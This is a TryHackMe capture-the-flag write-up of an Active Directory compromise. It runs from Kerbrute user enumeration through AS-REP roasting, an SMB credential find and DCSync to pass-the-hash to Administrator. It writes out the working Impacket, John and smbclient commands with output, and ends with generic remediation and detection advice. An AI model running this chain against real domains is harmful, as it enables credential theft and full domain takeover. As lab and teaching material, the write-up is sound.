---
layout: default
title: "TryHackMe - Attacktive Directory"
---

# TryHackMe - Attacktive Directory

**OS:** Windows (Active Directory)

Attacktive Directory walks through a realistic Active Directory compromise chain against the `spookysec.local` domain. Kerbrute enumerates valid usernames, ASREPRoasting recovers a crackable hash for `svc-admin`, SMB access with those credentials surfaces base64-encoded credentials for the `backup` account, and that account has DCSync rights - enabling a full credential dump and pass-the-hash to Administrator.

| Field | Value |
|---|---|
| Platform | TryHackMe |
| Target | `<target-ip> / domain controller` |
| Initial Access | AS-REP roasting to crack a domain credential |
| Privilege Escalation | DCSync rights abuse and pass-the-hash to Administrator |
| Final Access | Domain Administrator / full domain compromise |

---

## Attack Path

1. Recon identified the exposed services and separated useful attack surface from noise.
2. The first break was AS-REP roasting to crack a domain credential.
3. Post-exploitation enumeration exposed DCSync rights abuse and pass-the-hash to Administrator.
4. The final privileged context was reached and the required proof was captured.

---

## Recon

### Domain and Username Enumeration

The target had numerous services open but nothing immediately actionable. Kerbrute's `userenum` module against `spookysec.local` using the supplied user list found valid accounts:

```
/opt/kerbrute/kerbrute_linux_386 userenum -d spookysec.local --dc <target-ip> userlist.txt

[+] VALID USERNAME: james@spookysec.local
[+] VALID USERNAME: svc-admin@spookysec.local
[+] VALID USERNAME: robin@spookysec.local
[+] VALID USERNAME: darkstar@spookysec.local
[+] VALID USERNAME: administrator@spookysec.local
[+] VALID USERNAME: backup@spookysec.local
[+] VALID USERNAME: paradox@spookysec.local
```

### ASREPRoasting

With a valid user list, Impacket's `GetNPUsers` checked for accounts with pre-authentication disabled (DONT_REQUIRE_PREAUTH). `svc-admin` was vulnerable, returning an AS-REP hash:

```
impacket-GetNPUsers spookysec.local/ -usersfile valid-users.txt -format john -outputfile asrep.hash

$krb5asrep$svc-admin@SPOOKYSEC.LOCAL:<redacted-32-hex>$...
```

John cracked the hash against the supplied password list:

```
john --wordlist=passwordlist.txt --format=krb5asrep asrep.hash

management2005   ($krb5asrep$svc-admin@SPOOKYSEC.LOCAL)
```

### SMB Access and Credential Discovery

Direct login with `svc-admin` via standard methods failed, but the account could authenticate to SMB. Listing shares revealed a `backup` share. Inside it, `backup_credentials.txt` contained a base64-encoded string:

```
smbclient -U 'svc-admin' \\\\<target-ip>\\backup
smb: \> get backup_credentials.txt

cat backup_credentials.txt | base64 -d
backup@spookysec.local:backup2517860
```

---

## Initial Access

### DCSync via backup Account

The `backup` account's name suggested replication rights. Impacket's `secretsdump` confirmed it - the account held `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` privileges, allowing a full domain credential dump (DCSync):

```
impacket-secretsdump -dc-ip <target-ip> backup:backup2517860@spookysec.local

Administrator:500:<redacted-32-hex>:<redacted-32-hex>:::
krbtgt:502:<redacted-32-hex>:<redacted-32-hex>:::
```

With the Administrator NTLM hash, a pass-the-hash attack via `impacket-psexec` gave a SYSTEM shell:

```
impacket-psexec -dc-ip <target-ip> administrator@spookysec.local \
  -hashes <redacted-32-hex>:<redacted-32-hex>

C:\Windows\system32>
```

---

## Summary

Attacktive Directory covers a clean AD attack chain: user enumeration, ASREPRoasting, SMB credential discovery, and DCSync. The `backup` account having DCSync rights is realistic - accounts created for backup software or directory synchronization frequently receive excessive replication permissions and are often overlooked during access reviews.

**Key takeaway:** Accounts with DCSync rights are as sensitive as Domain Admins - a credential dump via `secretsdump` retrieves every user's NTLM hash, enabling pass-the-hash against any account in the domain.

---

## Root Cause

The demonstrated path worked because Kerberos pre-authentication disabled on a crackable account, excessive replication rights gave the attacker a bridge from reconnaissance to execution. The important pattern is the chain: AS-REP roasting to crack a domain credential created a foothold, and DCSync rights abuse and pass-the-hash to Administrator converted that foothold into Domain Administrator / full domain compromise.

## Impact

Successful exploitation reached Domain Administrator / full domain compromise. That level of access allows command execution, proof or sensitive-file access, credential collection, and a realistic path to additional systems if the same credentials, services, or trust relationships exist elsewhere.

## Remediation

- Remove or harden the specific exposure used for initial access: AS-REP roasting to crack a domain credential.
- Fix the privilege boundary that enabled escalation: DCSync rights abuse and pass-the-hash to Administrator.
- Audit AD privileges with BloodHound/PowerView and remove nonessential tier-0 rights.
- Rotate credentials observed or replayed during the chain and search for reuse on adjacent systems.
- Validate the fix by safely replaying the enumeration steps that originally exposed the weakness.

## Detection Opportunities

- Alert on exploit attempts or suspicious access patterns against the service that enabled initial access.
- Correlate successful authentication, new process creation, and privilege-boundary events after enumeration activity.
- Monitor for the specific escalation signal: DCSync rights abuse and pass-the-hash to Administrator.
- Collect and review Kerberos, LDAP, certificate, and directory-replication events for nonstandard principals.

## Lessons Learned

- The winning path was not just a vulnerable service; it was the connection between AS-REP roasting to crack a domain credential and DCSync rights abuse and pass-the-hash to Administrator.
- Preserve the observations that explain why each pivot made sense, not only the commands that worked.
- Write remediation from the root cause of each step so the report reads like an operator narrative and a defender action plan.
